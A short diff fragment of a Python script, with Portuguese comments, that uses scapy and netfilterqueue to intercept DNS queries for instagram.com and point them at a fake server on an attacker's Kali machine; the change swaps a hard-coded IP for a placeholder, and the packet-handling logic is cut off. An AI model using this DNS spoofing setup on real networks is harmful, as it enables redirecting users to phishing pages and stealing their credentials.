@@ -2,7 +2,7 @@ from scapy.all import *
 from netfilterqueue import NetfilterQueue
 
 target_domain = b"instagram.com."
-fake_ip = "192.168.1.100"  # IP do seu Kali/server fake
+fake_ip = "<IP KALI>"  # IP do seu Kali/server fake
 
 def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
